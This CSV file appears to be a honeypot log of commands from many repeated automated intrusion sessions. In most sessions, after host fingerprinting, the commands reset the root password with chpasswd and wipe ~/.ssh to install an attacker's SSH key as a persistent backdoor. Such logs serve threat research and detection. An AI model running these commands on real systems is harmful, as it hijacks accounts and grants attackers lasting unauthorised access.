id,session,timestamp,realm,input
178,53935b50e772,2022-11-15T21:00:54.738345Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
179,3a8636ece211,2022-11-15T21:02:57.158797Z,,"cat /proc/cpuinfo | grep name | wc -l"
180,3a8636ece211,2022-11-15T21:02:57.750876Z,,"echo ""root:yRkxzh0lR4Ul""|chpasswd|bash"
181,3a8636ece211,2022-11-15T21:02:58.424997Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
182,3a8636ece211,2022-11-15T21:02:59.019436Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
183,3a8636ece211,2022-11-15T21:02:59.688524Z,,"which ls"
184,3a8636ece211,2022-11-15T21:02:59.687673Z,,"ls -lh $(which ls)"
185,3a8636ece211,2022-11-15T21:03:00.323001Z,,"crontab -l"
186,3a8636ece211,2022-11-15T21:03:01.174617Z,,w
187,3a8636ece211,2022-11-15T21:03:01.861898Z,,"uname -m"
188,3a8636ece211,2022-11-15T21:03:02.925470Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
189,3a8636ece211,2022-11-15T21:03:03.631481Z,,top
190,3a8636ece211,2022-11-15T21:03:04.728703Z,,uname
191,3a8636ece211,2022-11-15T21:03:05.375336Z,,"uname -a"
192,3a8636ece211,2022-11-15T21:03:06.460534Z,,"lscpu | grep Model"
193,3a8636ece211,2022-11-15T21:03:08.767348Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
194,2519ad76f28c,2022-11-15T21:03:11.977039Z,,"cat /proc/cpuinfo | grep name | wc -l"
195,2519ad76f28c,2022-11-15T21:03:12.173932Z,,"echo ""root:sfyQCkIfixEE""|chpasswd|bash"
196,2519ad76f28c,2022-11-15T21:03:12.271331Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
197,2519ad76f28c,2022-11-15T21:03:12.445603Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
198,2519ad76f28c,2022-11-15T21:03:12.582245Z,,"which ls"
199,2519ad76f28c,2022-11-15T21:03:12.678793Z,,"crontab -l"
200,2519ad76f28c,2022-11-15T21:03:12.581481Z,,"ls -lh $(which ls)"
201,2519ad76f28c,2022-11-15T21:03:12.959588Z,,"uname -m"
202,2519ad76f28c,2022-11-15T21:03:12.861584Z,,w
203,2519ad76f28c,2022-11-15T21:03:13.130749Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
204,2519ad76f28c,2022-11-15T21:03:13.269827Z,,top
205,2519ad76f28c,2022-11-15T21:03:13.365347Z,,uname
206,2519ad76f28c,2022-11-15T21:03:13.541726Z,,"uname -a"
207,2519ad76f28c,2022-11-15T21:03:13.638035Z,,"lscpu | grep Model"
208,2519ad76f28c,2022-11-15T21:03:13.817124Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
209,d53b34159d60,2022-11-15T21:04:25.175601Z,,"cat /proc/cpuinfo | grep name | wc -l"
210,d53b34159d60,2022-11-15T21:04:25.301925Z,,"echo ""root:KcLsd3TugOJP""|chpasswd|bash"
211,d53b34159d60,2022-11-15T21:04:25.501333Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
212,d53b34159d60,2022-11-15T21:04:25.662152Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
213,d53b34159d60,2022-11-15T21:04:25.782400Z,,"which ls"
214,d53b34159d60,2022-11-15T21:04:25.781643Z,,"ls -lh $(which ls)"
215,d53b34159d60,2022-11-15T21:04:25.972719Z,,"crontab -l"
216,d53b34159d60,2022-11-15T21:04:26.083894Z,,w
217,d53b34159d60,2022-11-15T21:04:26.276996Z,,"uname -m"
218,d53b34159d60,2022-11-15T21:04:26.430285Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
219,d53b34159d60,2022-11-15T21:04:26.541353Z,,top
220,d53b34159d60,2022-11-15T21:04:26.746828Z,,uname
221,d53b34159d60,2022-11-15T21:04:26.857044Z,,"uname -a"
222,d53b34159d60,2022-11-15T21:04:27.047708Z,,"lscpu | grep Model"
223,d53b34159d60,2022-11-15T21:04:27.203541Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
224,f28df54868af,2022-11-15T21:04:33.417633Z,,"cat /proc/cpuinfo | grep name | wc -l"
225,f28df54868af,2022-11-15T21:04:34.161274Z,,"echo ""root:SoOdZQu2rthx""|chpasswd|bash"
226,f28df54868af,2022-11-15T21:04:34.916196Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
227,f28df54868af,2022-11-15T21:04:35.640621Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
228,f28df54868af,2022-11-15T21:04:36.326956Z,,"which ls"
229,f28df54868af,2022-11-15T21:04:36.326215Z,,"ls -lh $(which ls)"
230,f28df54868af,2022-11-15T21:04:36.971522Z,,"crontab -l"
231,f28df54868af,2022-11-15T21:04:37.713489Z,,w
232,f28df54868af,2022-11-15T21:04:38.443440Z,,"uname -m"
233,f28df54868af,2022-11-15T21:04:39.188717Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
234,f28df54868af,2022-11-15T21:04:40.402761Z,,top
235,f28df54868af,2022-11-15T21:04:41.126270Z,,uname
236,f28df54868af,2022-11-15T21:04:42.272414Z,,"uname -a"
237,f28df54868af,2022-11-15T21:04:43.414929Z,,"lscpu | grep Model"
238,f28df54868af,2022-11-15T21:04:45.328481Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
239,b833104e5bc5,2022-11-15T21:06:42.250961Z,,"cat /proc/cpuinfo | grep name | wc -l"
240,b833104e5bc5,2022-11-15T21:06:42.351843Z,,"echo ""root:aja5nyiYSqcG""|chpasswd|bash"
241,b833104e5bc5,2022-11-15T21:06:42.537039Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
242,b833104e5bc5,2022-11-15T21:06:42.693116Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
243,b833104e5bc5,2022-11-15T21:06:42.794755Z,,"which ls"
244,b833104e5bc5,2022-11-15T21:06:42.793848Z,,"ls -lh $(which ls)"
245,b833104e5bc5,2022-11-15T21:06:42.980588Z,,"crontab -l"
246,b833104e5bc5,2022-11-15T21:06:43.086154Z,,w
247,b833104e5bc5,2022-11-15T21:06:43.272337Z,,"uname -m"
248,b833104e5bc5,2022-11-15T21:06:43.413775Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
249,b833104e5bc5,2022-11-15T21:06:43.515977Z,,top
250,b833104e5bc5,2022-11-15T21:06:43.698247Z,,uname
251,b833104e5bc5,2022-11-15T21:06:43.812309Z,,"uname -a"
252,b833104e5bc5,2022-11-15T21:06:43.991419Z,,"lscpu | grep Model"
253,b833104e5bc5,2022-11-15T21:06:44.134255Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
254,6ca2844f02b8,2022-11-15T21:07:36.364057Z,,"cat /proc/cpuinfo | grep name | wc -l"
255,6ca2844f02b8,2022-11-15T21:07:37.047697Z,,"echo ""root:iJcIN8K2wuU6""|chpasswd|bash"
256,6ca2844f02b8,2022-11-15T21:07:37.944591Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
257,6ca2844f02b8,2022-11-15T21:07:38.534746Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
258,6ca2844f02b8,2022-11-15T21:07:39.208196Z,,"which ls"
259,6ca2844f02b8,2022-11-15T21:07:39.207336Z,,"ls -lh $(which ls)"
260,6ca2844f02b8,2022-11-15T21:07:39.796989Z,,"crontab -l"
261,6ca2844f02b8,2022-11-15T21:07:40.542995Z,,w
262,6ca2844f02b8,2022-11-15T21:07:41.433842Z,,"uname -m"
263,6ca2844f02b8,2022-11-15T21:07:42.046673Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
264,6ca2844f02b8,2022-11-15T21:07:42.933944Z,,top
265,6ca2844f02b8,2022-11-15T21:07:43.965927Z,,uname
266,6ca2844f02b8,2022-11-15T21:07:44.757406Z,,"uname -a"
267,6ca2844f02b8,2022-11-15T21:07:45.392084Z,,"lscpu | grep Model"
268,6ca2844f02b8,2022-11-15T21:07:46.037959Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
269,7964a30a7f32,2022-11-15T21:09:04.977044Z,,"cat /proc/cpuinfo | grep name | wc -l"
270,7964a30a7f32,2022-11-15T21:09:05.568564Z,,"echo ""root:sVsHxUA5BpH2""|chpasswd|bash"
271,7964a30a7f32,2022-11-15T21:09:06.235865Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
272,7964a30a7f32,2022-11-15T21:09:06.872553Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
273,7964a30a7f32,2022-11-15T21:09:07.466225Z,,"which ls"
274,7964a30a7f32,2022-11-15T21:09:07.464822Z,,"ls -lh $(which ls)"
275,7964a30a7f32,2022-11-15T21:09:08.136002Z,,"crontab -l"
276,7964a30a7f32,2022-11-15T21:09:08.774115Z,,w
277,7964a30a7f32,2022-11-15T21:09:09.390362Z,,"uname -m"
278,7964a30a7f32,2022-11-15T21:09:10.072654Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
279,7964a30a7f32,2022-11-15T21:09:10.700125Z,,top
280,7964a30a7f32,2022-11-15T21:09:11.373965Z,,uname
281,7964a30a7f32,2022-11-15T21:09:12.089883Z,,"uname -a"
282,7964a30a7f32,2022-11-15T21:09:12.723919Z,,"lscpu | grep Model"
283,7964a30a7f32,2022-11-15T21:09:15.190770Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
284,656d7936c94c,2022-11-15T21:11:30.278595Z,,"cat /proc/cpuinfo | grep name | wc -l"
285,656d7936c94c,2022-11-15T21:11:30.440458Z,,"echo ""root:voV3PVA24NGs""|chpasswd|bash"
286,656d7936c94c,2022-11-15T21:11:30.545755Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
287,656d7936c94c,2022-11-15T21:11:30.620263Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
288,656d7936c94c,2022-11-15T21:11:30.767740Z,,"which ls"
289,656d7936c94c,2022-11-15T21:11:30.766463Z,,"ls -lh $(which ls)"
290,656d7936c94c,2022-11-15T21:11:30.831357Z,,"crontab -l"
291,656d7936c94c,2022-11-15T21:11:30.968586Z,,w
292,656d7936c94c,2022-11-15T21:11:31.071747Z,,"uname -m"
293,656d7936c94c,2022-11-15T21:11:31.138873Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
294,656d7936c94c,2022-11-15T21:11:31.289830Z,,top
295,656d7936c94c,2022-11-15T21:11:31.395520Z,,uname
296,656d7936c94c,2022-11-15T21:11:31.494679Z,,"uname -a"
297,656d7936c94c,2022-11-15T21:11:31.654160Z,,"lscpu | grep Model"
298,656d7936c94c,2022-11-15T21:11:31.719009Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
299,878c5f266025,2022-11-15T21:12:04.832795Z,,"cat /proc/cpuinfo | grep name | wc -l"
300,878c5f266025,2022-11-15T21:12:06.165052Z,,"echo ""root:6exJtvDtccP8""|chpasswd|bash"
301,878c5f266025,2022-11-15T21:12:06.758516Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
302,878c5f266025,2022-11-15T21:12:07.863652Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
303,878c5f266025,2022-11-15T21:12:08.454118Z,,"which ls"
304,878c5f266025,2022-11-15T21:12:08.453014Z,,"ls -lh $(which ls)"
305,878c5f266025,2022-11-15T21:12:09.120624Z,,"crontab -l"
306,878c5f266025,2022-11-15T21:12:09.753592Z,,w
307,878c5f266025,2022-11-15T21:12:10.342319Z,,"uname -m"
308,878c5f266025,2022-11-15T21:12:11.017102Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
309,878c5f266025,2022-11-15T21:12:12.001348Z,,top
310,878c5f266025,2022-11-15T21:12:12.670682Z,,uname
311,878c5f266025,2022-11-15T21:12:13.305697Z,,"uname -a"
312,878c5f266025,2022-11-15T21:12:13.896612Z,,"lscpu | grep Model"
313,878c5f266025,2022-11-15T21:12:14.630141Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
314,971d4b1e9a89,2022-11-15T21:13:28.945524Z,,"cat /proc/cpuinfo | grep name | wc -l"
315,971d4b1e9a89,2022-11-15T21:13:29.540540Z,,"echo ""root:FV4DfDb86l54""|chpasswd|bash"
316,971d4b1e9a89,2022-11-15T21:13:30.217407Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
317,971d4b1e9a89,2022-11-15T21:13:30.818137Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
318,971d4b1e9a89,2022-11-15T21:13:31.492664Z,,"which ls"
319,971d4b1e9a89,2022-11-15T21:13:31.491663Z,,"ls -lh $(which ls)"
320,971d4b1e9a89,2022-11-15T21:13:32.156807Z,,"crontab -l"
321,971d4b1e9a89,2022-11-15T21:13:33.491504Z,,w
322,971d4b1e9a89,2022-11-15T21:13:34.174117Z,,"uname -m"
323,971d4b1e9a89,2022-11-15T21:13:34.776116Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
324,971d4b1e9a89,2022-11-15T21:13:35.447527Z,,top
325,971d4b1e9a89,2022-11-15T21:13:36.557700Z,,uname
326,971d4b1e9a89,2022-11-15T21:13:37.307193Z,,"uname -a"
327,971d4b1e9a89,2022-11-15T21:13:38.316590Z,,"lscpu | grep Model"
328,0be73af6b642,2022-11-15T21:13:38.906465Z,,"cat /proc/cpuinfo | grep name | wc -l"
329,0be73af6b642,2022-11-15T21:13:39.109830Z,,"echo ""root:uXuWwH5nyq2n""|chpasswd|bash"
330,971d4b1e9a89,2022-11-15T21:13:39.192883Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
331,0be73af6b642,2022-11-15T21:13:39.251237Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
332,0be73af6b642,2022-11-15T21:13:39.459652Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
333,0be73af6b642,2022-11-15T21:13:39.634616Z,,"ls -lh $(which ls)"
334,0be73af6b642,2022-11-15T21:13:39.635907Z,,"which ls"
335,0be73af6b642,2022-11-15T21:13:39.741860Z,,"crontab -l"
336,0be73af6b642,2022-11-15T21:13:39.930182Z,,w
337,0be73af6b642,2022-11-15T21:13:40.036457Z,,"uname -m"
338,0be73af6b642,2022-11-15T21:13:40.222540Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
339,0be73af6b642,2022-11-15T21:13:40.373512Z,,top
340,0be73af6b642,2022-11-15T21:13:40.486345Z,,uname
341,0be73af6b642,2022-11-15T21:13:40.670291Z,,"uname -a"
342,0be73af6b642,2022-11-15T21:13:40.776198Z,,"lscpu | grep Model"
343,0be73af6b642,2022-11-15T21:13:40.956946Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
344,4f6b921367dd,2022-11-15T21:15:59.408239Z,,"cat /proc/cpuinfo | grep name | wc -l"
345,4f6b921367dd,2022-11-15T21:15:59.522166Z,,"echo ""root:QDEXNh10wGNv""|chpasswd|bash"
346,4f6b921367dd,2022-11-15T21:15:59.727816Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
347,4f6b921367dd,2022-11-15T21:15:59.839775Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
348,4f6b921367dd,2022-11-15T21:16:00.036425Z,,"which ls"
349,4f6b921367dd,2022-11-15T21:16:00.035631Z,,"ls -lh $(which ls)"
350,4f6b921367dd,2022-11-15T21:16:00.196574Z,,"crontab -l"
351,4f6b921367dd,2022-11-15T21:16:00.307957Z,,w
352,4f6b921367dd,2022-11-15T21:16:00.509822Z,,"uname -m"
353,4f6b921367dd,2022-11-15T21:16:00.668149Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
354,4f6b921367dd,2022-11-15T21:16:00.783937Z,,top
355,4f6b921367dd,2022-11-15T21:16:00.980872Z,,uname
356,4f6b921367dd,2022-11-15T21:16:01.093454Z,,"uname -a"
357,4f6b921367dd,2022-11-15T21:16:01.284270Z,,"lscpu | grep Model"
358,4f6b921367dd,2022-11-15T21:16:01.445464Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
359,14b3da569a31,2022-11-15T21:17:34.939815Z,,"cat /proc/cpuinfo | grep name | wc -l"
360,14b3da569a31,2022-11-15T21:17:35.551285Z,,"echo ""root:Xt1liVkJ36mD""|chpasswd|bash"
